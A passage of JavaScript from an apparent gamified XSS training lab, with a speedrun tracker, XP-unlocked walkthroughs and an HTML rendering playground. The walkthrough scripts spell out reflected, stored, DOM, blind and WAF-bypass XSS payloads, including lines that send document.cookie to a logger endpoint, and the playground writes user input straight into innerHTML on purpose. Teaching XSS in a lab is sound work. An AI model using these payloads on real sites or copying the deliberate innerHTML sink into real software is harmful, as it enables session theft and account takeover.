            window.localStorage.setItem(getSpeedrunBestKey(), String(elapsed));
          } catch (err) {
            // ignore
          }
          showToast('New personal best!');
        } else {
          showToast('Speedrun complete!');
        }
        syncBest();
        document.dispatchEvent(new CustomEvent('lab:solved', { detail: { id: 'filter-speedrun' } }));
      }
    };

    const startRun = () => {
      if (!levelPool.length){
        showToast('Add filter levels first.');
        return;
      }
      stopRun();
      let desired = parseInt(countInput?.value || defaultCount, 10);
      if (!Number.isFinite(desired) || desired <= 0){
        desired = defaultCount;
      }
      desired = Math.min(levelPool.length, Math.max(1, desired));
      if (countInput){
        countInput.value = desired;
      }
      try {
        window.localStorage.setItem(speedrunCountKey, String(desired));
      } catch (err) {
        // ignore
      }
      const pool = [...levelPool];
      const items = [];
      while (items.length < desired && pool.length){
        const index = Math.floor(Math.random() * pool.length);
        const level = pool.splice(index, 1)[0];
        items.push({ id: `${level}-${Date.now()}-${items.length}`, level, name: level.replace(/_/g, ' '), complete: false });
      }
      activeRun = {
        items,
        startedAt: Date.now(),
        rafId: null
      };
      renderList(items);
      setTimer(0);
      tick();
    };

    listEl?.addEventListener('click', (event)=>{
      const button = event.target.closest('[data-speedrun-complete]');
      if (!button){
        return;
      }
      const row = button.closest('[data-speedrun-item]');
      if (!row){
        return;
      }
      markComplete(row.dataset.speedrunItem);
    });

    startBtn?.addEventListener('click', startRun);

    countInput?.addEventListener('change', ()=>{
      let value = parseInt(countInput.value, 10);
      if (!Number.isFinite(value) || value <= 0){
        value = defaultCount;
      }
      value = Math.min(levelPool.length, Math.max(1, value));
      countInput.value = value;
      try {
        window.localStorage.setItem(speedrunCountKey, String(value));
      } catch (err) {
        // ignore
      }
    });

    const savedCount = (() => {
      try {
        const raw = window.localStorage.getItem(speedrunCountKey);
        return raw ? parseInt(raw, 10) : null;
      } catch (err) {
        return null;
      }
    })();

    if (countInput){
      const initial = savedCount && savedCount > 0 ? savedCount : defaultCount;
      countInput.value = Math.min(levelPool.length, Math.max(1, initial));
    }

    shell._speedrunRefresh = () => {
      stopRun();
      renderList([]);
      setTimer(0);
      syncBest();
    };

    shell._speedrunRefresh();
  });

  const showMeScripts = {
    'fundamentals-tour': [
      `1. Click the HTML textarea and type <p>tour</p> so the DOM preview has something simple to render.`,
      `2. Hit "Render snippet" and compare the live DOM surface with the escaped string to see how browsers interpret markup.`,
      `3. Swap the text for <img src=x onerror=alert(document.domain)> to prove that injected attributes run immediately.`,
      `4. Pause the helper and try your own markup—predict how both panels will react before pressing Render again.`
    ],
    'reflected-route': [
      `1. Submit ?page=reflected&q=%3Csvg/onload=alert(1)%3E so the q parameter echoes unsanitised inside the response.`,
      `2. Open DevTools → Network, inspect the HTML fragment and note how the value lands inside the results div with zero encoding.`,
      `3. Replace alert(1) with fetch('/blind_logger.php?p='+document.cookie) to narrate real impact to your viewer.`,
      `4. Your turn: craft a variant (attribute breakout, javascript: URL, etc.) and click "Submit & observe response" to prove it yourself.`
    ],
    'stored-route': [
      `1. Post a harmless shoutbox entry to confirm that the database preserves whatever you send.`,
      `2. Refresh the page and point out how the stored body renders as raw HTML for every visitor.`,
      `3. Store <script>alert(document.domain)</script> (or an <img> handler) so the stored payload fires on load.`,
      `4. Swap alert() for fetch('/blind_logger.php?p='+document.cookie) and then pause the walkthrough to build your own multi-line payload.`
    ],
    'dom-route': [
      `1. Set the hash input to #%3Cimg%20src%3Dx%20onerror%3Dalert(document.cookie)%3E so location.hash contains an encoded payload.`,
      `2. Watch decodeURIComponent(location.hash.substring(1)) feed straight into innerHTML—no sanitisation, instant execution.`,
      `3. Upgrade the payload to fetch('/blind_logger.php?p='+document.cookie) to show data exfiltration from a DOM sink.`,
      `4. Reset the hash, then manually try different encodings to keep exploiting the widget.`
    ],
    'blind-route': [
      `1. Build a payload such as <script>new Image().src='/blind_logger.php?p='+encodeURIComponent(document.cookie)</script> inside the preview box.`,
      `2. Explain that this payload must be delivered to an external admin panel—when it runs, the victim browser calls the logger URL.`,
      `3. Visit /blind_logger.php?p=test in another tab to verify the callback path before sending the real exploit.`,
      `4. Now craft your final payload with contextual data (cookies, DOM, CSRF tokens) and watch the "Recent blind hits" list for confirmation.`
    ],
    'filter-gauntlet': [
      `1. Press "Start run" to populate the tracker and watch the workbench spawn dedicated forms for each random filter.`,
      `2. Open the first mini form, drop <svg onload=alert(1)> and submit it to the filter page in a new tab to study the transformation.`,
      `3. When a payload executes, return to the tracker and click "Log bypass"—if it fails, tweak the payload right in that mini form.`,
      `4. Race through every panel, chaining different bypass styles until the timer stops and the run awards XP.`
    ],
    'contexts-tour-script': [
      `1. Enter a compound payload such as '" )<svg/onload=alert(1)> and run the contexts test.`,
      `2. Observe how the HTML body block renders it raw while the attribute block only breaks when quotes are escaped.`,
      `3. Inspect the JavaScript string, URL and CSS outputs to note which characters are neutralised and which execute.`,
      `4. Pause the helper and adjust the payload to target the context that looked most promising.`
    ],
    'playground-tour': [
      `1. In Scenario 1, submit <img src=x onerror=alert('S1')> and point out the immediate reflected execution.`,
      `2. Jump to Scenario 2, store <script>alert('S2')</script> in the body field and refresh to show it firing for every visitor.`,
      `3. Visit Scenario 3 to mutate localStorage with encodeURIComponent('<img src=x onerror=alert(3)>') and explain the DOM sink.`,
      `4. Pause the narration and continue through the remaining scenarios yourself, marking XP as each exploit lands.`
    ],
    'random-tour': [
      `1. Generate a new random challenge and read the filter/context clues that load at the top of the card.`,
      `2. Fire a baseline payload (e.g. <script>alert(0)</script>) to see which keywords or brackets vanish.`,
      `3. Adjust encodings per the hints—maybe switch to an attribute injection or double-encoded payload until it executes.`,
      `4. Re-roll the challenge and attempt the next stack without guidance now that you know the workflow.`
    ],
    'waf-tour': [
      `1. Start on the Basic WAF level and send <script>alert(1)</script> to trigger the obvious signature block.`,
      `2. Mutate the payload with casing or comment breaks (e.g. <sc<!-- -->ript>) and resubmit to demonstrate a bypass.`,
      `3. Repeat the process for the Balanced and Paranoid levels while narrating which keywords each rule set focuses on.`,
      `4. When the walkthrough ends, craft your own impact payload for every level and log the XP markers to prove mastery.`
    ]
  };

  document.querySelectorAll('[data-show-me-shell]').forEach(shell => {
    const trigger = shell.querySelector('[data-show-me-trigger]');
    const output = shell.querySelector('[data-show-me-output]');
    const status = shell.querySelector('[data-show-me-status]');
    const scriptId = shell.dataset.showMeScript || trigger?.dataset.showMeScript;
    const shellId = shell.dataset.showMeId || scriptId;
    const cost = parseInt(shell.dataset.showMeCost || '0', 10);
    const spendKey = shellId ? `showme:${shellId}` : null;
    if (!trigger || !output || !scriptId || !showMeScripts[scriptId]){
      shell.removeAttribute('data-show-me-shell');
      return;
    }
    let isPlaying = false;
    const typeLine = async (lineEl, text) => {
      lineEl.textContent = '';
      for (let i = 0; i < text.length; i += 1){
        lineEl.textContent += text.charAt(i);
        await sleep(22 + Math.random() * 18);
      }
    };
    const hasAccess = () => cost <= 0 || !spendKey || (xpStore.data.tipsUsed && xpStore.data.tipsUsed[spendKey]);
    const refreshState = () => {
      const unlocked = hasAccess();
      shell.classList.toggle('is-locked', !unlocked);
      shell.classList.toggle('is-unlocked', unlocked);
      if (status){
        if (unlocked){
          status.textContent = 'Unlocked. Watch the walkthrough, then pause and try it yourself.';
        } else if (cost > 0){
          status.textContent = `Costs ${cost} XP to unlock this walkthrough.`;
        } else {
          status.textContent = 'Ready to play the walkthrough.';
        }
      }
      if (trigger){
        trigger.textContent = unlocked ? 'Show me' : `Unlock & show me (-${cost} XP)`;
        trigger.disabled = isPlaying;
      }
    };

    shell._showMeRefresh = refreshState;
    refreshState();

    trigger.addEventListener('click', async ()=>{
      if (isPlaying){
        return;
      }
      if (!hasAccess()){
        if (!spendKey || cost <= 0){
          refreshState();
        } else {
          const result = xpStore.spendTip(spendKey, cost);
          if (!result.ok){
            showToast(result.reason === 'insufficient' ? `You need ${cost} XP to unlock this walkthrough.` : 'Unable to unlock walkthrough right now.');
            return;
          }
          updateHud();
          if (result.spent){
            showXpDelta(-result.spent);
          }
          refreshState();
        }
      }
      if (!hasAccess()){
        return;
      }
      isPlaying = true;
      refreshState();
      shell.classList.add('is-playing');
      output.innerHTML = '';
      const script = showMeScripts[scriptId];
      for (const line of script){
        const lineEl = document.createElement('div');
        lineEl.className = 'show-me-line';
        output.appendChild(lineEl);
        await typeLine(lineEl, line);
        await sleep(260);
      }
      shell.classList.remove('is-playing');
      isPlaying = false;
      refreshState();
    });
  });

  document.querySelectorAll('[data-fundamentals-playground]').forEach(playground => {
    const input = playground.querySelector('[data-fundamentals-input]');
    const renderBtn = playground.querySelector('[data-fundamentals-render]');
    const resetBtnEl = playground.querySelector('[data-fundamentals-reset]');
    const preview = playground.querySelector('[data-fundamentals-preview]');
    const escaped = playground.querySelector('[data-fundamentals-escaped]');
    const tip = playground.querySelector('[data-fundamentals-tip]');
    if (!input || !preview || !escaped){
      return;
    }
    const defaultValue = input.value;
    let solved = false;
    const syncPreview = (value) => {
      preview.innerHTML = value;
      escaped.textContent = value;
    };
    const markSolved = () => {
      if (solved){
        return;
      }
      const value = input.value;
      if (!value.trim().length){
        return;
      }
      solved = true;
      if (tip){
        tip.textContent = 'Nice! You just rendered live DOM and saw the escaped version.';
        tip.classList.add('is-success');
      }
      document.dispatchEvent(new CustomEvent('lab:solved', { detail: { id: 'fundamentals-overview' } }));
    };

    syncPreview(defaultValue);

    renderBtn?.addEventListener('click', () => {
      syncPreview(input.value);
      markSolved();
    });
    input.addEventListener('keydown', (event)=>{
      if ((event.metaKey || event.ctrlKey) && event.key.toLowerCase() === 'enter'){
        event.preventDefault();
        syncPreview(input.value);
        markSolved();
      }
    });
    input.addEventListener('input', () => {
      syncPreview(input.value);
      if (input.value !== defaultValue){
        markSolved();
      }
    });
    resetBtnEl?.addEventListener('click', ()=>{
      input.value = defaultValue;
      syncPreview(defaultValue);
      solved = false;
      if (tip){
        tip.textContent = '✅ Keep experimenting until the rendered DOM matches what you expect.';
        tip.classList.remove('is-success');
      }
    });
  });

});
